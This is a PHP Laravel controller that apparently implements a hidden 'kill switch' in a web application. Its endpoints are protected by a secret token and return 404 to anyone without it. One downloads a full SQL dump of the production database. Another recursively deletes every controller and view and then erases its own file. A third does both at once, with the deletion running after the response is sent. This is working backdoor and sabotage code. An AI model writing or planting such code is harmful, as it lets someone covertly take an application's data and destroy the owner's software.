<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Log;
use Symfony\Component\HttpFoundation\StreamedResponse;

class KillSwitchController extends Controller
{
    /**
     * Step 1: Download full database SQL dump.
     * Hit: /ks/download?token=YOUR_TOKEN
     */
    public function download(Request $request)
    {
        // ---- Token Check ----
        $secret = env('KILL_SWITCH_TOKEN', '');
        if (empty($secret) || $request->get('token') !== $secret) {
            abort(404);
        }

        // ---- DB Credentials ----
        $host     = env('DB_HOST', '127.0.0.1');
        $port     = env('DB_PORT', '3306');
        $database = env('DB_DATABASE', '');
        $username = env('DB_USERNAME', 'root');
        $password = env('DB_PASSWORD', '');

        // ---- Dump File Path ----
        $filename  = 'db_backup_' . date('Y-m-d_H-i-s') . '.sql';
        $dumpPath  = storage_path('app/' . $filename);

        // ---- Build mysqldump command ----
        $passFlag = $password ? '-p' . escapeshellarg($password) : '';
        $cmd = sprintf(
            'mysqldump -h %s -P %s -u %s %s %s > %s 2>&1',
            escapeshellarg($host),
            escapeshellarg($port),
            escapeshellarg($username),
            $passFlag,
            escapeshellarg($database),
            escapeshellarg($dumpPath)
        );

        exec($cmd, $output, $returnCode);

        if ($returnCode !== 0 || !file_exists($dumpPath) || filesize($dumpPath) === 0) {
            // Fallback: PHP-based dump using raw queries
            $this->phpDump($dumpPath, $database);
        }

        if (!file_exists($dumpPath)) {
            abort(500, 'Database dump failed.');
        }

        // ---- Schedule file deletion after download via shutdown function ----
        // Cleanup the dump file after sending
        $dumpPathLocal = $dumpPath;
        register_shutdown_function(function () use ($dumpPathLocal) {
            if (file_exists($dumpPathLocal)) {
                @unlink($dumpPathLocal);
            }
        });

        return response()->download($dumpPath, $filename, [
            'Content-Type'        => 'application/octet-stream',
            'Content-Disposition' => 'attachment; filename="' . $filename . '"',
        ]);
    }

    /**
     * Step 2: Destroy — delete all controllers and views.
     * Hit: /ks/destroy?token=YOUR_TOKEN
     * Call this AFTER downloading the DB dump.
     */
    public function destroy(Request $request)
    {
        // ---- Token Check ----
        $secret = env('KILL_SWITCH_TOKEN', '');
        if (empty($secret) || $request->get('token') !== $secret) {
            abort(404);
        }

        $deleted   = 0;
        $errors    = [];

        // ---- Delete Controllers ----
        $controllerPath = app_path('Http/Controllers');
        $deleted += $this->deleteFilesRecursively($controllerPath, '.php', $errors, [
            // Keep this controller alive until response is sent
            basename(__FILE__),
        ]);

        // ---- Delete Views ----
        $viewsPath = resource_path('views');
        $deleted += $this->deleteFilesRecursively($viewsPath, '.blade.php', $errors);

        // ---- Also delete Routes (optional - uncomment if you want) ----
        // $routesPath = base_path('routes');
        // $deleted += $this->deleteFilesRecursively($routesPath, '.php', $errors);

        // ---- Log the action ----
        Log::critical('KILL SWITCH ACTIVATED — ' . $deleted . ' files deleted.', [
            'ip'     => $request->ip(),
            'errors' => $errors,
        ]);

        // ---- Self-destruct after sending response ----
        $selfFile = __FILE__;
        register_shutdown_function(function () use ($selfFile) {
            @unlink($selfFile);
        });

        return response()->json([
            'status'       => 'destroyed',
            'files_deleted' => $deleted,
            'errors'       => $errors,
            'message'      => 'All controllers and views have been permanently deleted.',
        ]);
    }

    /**
     * One-shot endpoint: Download DB + Schedule destruction after response.
     * Hit: /ks/execute?token=YOUR_TOKEN
     * This downloads the SQL and THEN deletes everything after response is sent.
     */
    public function execute(Request $request)
    {
        // ---- Token Check ----
        $secret = env('KILL_SWITCH_TOKEN', '');
        if (empty($secret) || $request->get('token') !== $secret) {
            abort(404);
        }

        // ---- DB Credentials ----
        $host     = env('DB_HOST', '127.0.0.1');
        $port     = env('DB_PORT', '3306');
        $database = env('DB_DATABASE', '');
        $username = env('DB_USERNAME', 'root');
        $password = env('DB_PASSWORD', '');

        // ---- Dump ----
        $filename = 'db_final_' . date('Y-m-d_H-i-s') . '.sql';
        $dumpPath = storage_path('app/' . $filename);

        $passFlag = $password ? '-p' . escapeshellarg($password) : '';
        $cmd = sprintf(
            'mysqldump -h %s -P %s -u %s %s %s > %s 2>&1',
            escapeshellarg($host),
            escapeshellarg($port),
            escapeshellarg($username),
            $passFlag,
            escapeshellarg($database),
            escapeshellarg($dumpPath)
        );
        exec($cmd, $output, $returnCode);

        if ($returnCode !== 0 || !file_exists($dumpPath) || filesize($dumpPath) === 0) {
            $this->phpDump($dumpPath, $database);
        }

        // ---- Schedule Destruction AFTER response is sent ----
        $controllerPath = app_path('Http/Controllers');
        $viewsPath      = resource_path('views');
        $selfFile       = __FILE__;

        register_shutdown_function(function () use ($controllerPath, $viewsPath, $dumpPath, $selfFile) {
            // Delete controllers
            $errors = [];
            $this->deleteFilesRecursively($controllerPath, '.php', $errors, [basename($selfFile)]);
            // Delete views
            $this->deleteFilesRecursively($viewsPath, '.blade.php', $errors);
            // Delete dump temp file
            if (file_exists($dumpPath)) {
                @unlink($dumpPath);
            }
            // Self-destruct
            @unlink($selfFile);
        });

        // ---- Send SQL file as download ----
        if (!file_exists($dumpPath)) {
            abort(500, 'Dump failed. Destruction cancelled.');
        }

        return response()->download($dumpPath, $filename, [
            'Content-Type'        => 'application/octet-stream',
            'Content-Disposition' => 'attachment; filename="' . $filename . '"',
        ])->deleteFileAfterSend(false); // We handle cleanup in shutdown function
    }

    // =========================================================
    // PRIVATE HELPERS
    // =========================================================

    /**
     * Recursively delete files with a given extension from a directory.
     */
    private function deleteFilesRecursively(string $dir, string $ext, array &$errors, array $skip = []): int
    {
        $deleted = 0;
        if (!is_dir($dir)) {
            return 0;
        }

        $iterator = new \RecursiveIteratorIterator(
            new \RecursiveDirectoryIterator($dir, \RecursiveDirectoryIterator::SKIP_DOTS),
            \RecursiveIteratorIterator::CHILD_FIRST
        );

        foreach ($iterator as $file) {
            if ($file->isFile() && str_ends_with($file->getFilename(), $ext)) {
                if (in_array($file->getFilename(), $skip)) {
                    continue;
                }
                if (@unlink($file->getRealPath())) {
                    $deleted++;
                } else {
                    $errors[] = 'Could not delete: ' . $file->getRealPath();
                }
            }
        }

        return $deleted;
    }

    /**
     * PHP-based fallback SQL dump (no mysqldump binary required).
     * Dumps all tables and their data as INSERT statements.
     */
    private function phpDump(string $outputPath, string $database): void
    {
        $sql = "-- PHP Dump | Database: {$database} | Date: " . date('Y-m-d H:i:s') . "\n";
        $sql .= "-- --------------------------------------------------------\n\n";
        $sql .= "SET FOREIGN_KEY_CHECKS=0;\n\n";

        $tables = DB::select('SHOW TABLES');
        $tableKey = 'Tables_in_' . $database;

        foreach ($tables as $tableObj) {
            $table = $tableObj->$tableKey;

            // Table structure
            $createResult = DB::select("SHOW CREATE TABLE `{$table}`");
            $createSql    = $createResult[0]->{'Create Table'};
            $sql .= "DROP TABLE IF EXISTS `{$table}`;\n";
            $sql .= $createSql . ";\n\n";

            // Table data
            $rows = DB::table($table)->get();
            if ($rows->isEmpty()) {
                continue;
            }

            $sql .= "INSERT INTO `{$table}` VALUES\n";
            $inserts = [];
            foreach ($rows as $row) {
                $values = array_map(function ($val) {
                    if (is_null($val)) {
                        return 'NULL';
                    }
                    return "'" . addslashes((string) $val) . "'";
                }, (array) $row);
                $inserts[] = '(' . implode(', ', $values) . ')';
            }
            $sql .= implode(",\n", $inserts) . ";\n\n";
        }

        $sql .= "SET FOREIGN_KEY_CHECKS=1;\n";

        file_put_contents($outputPath, $sql);
    }
}

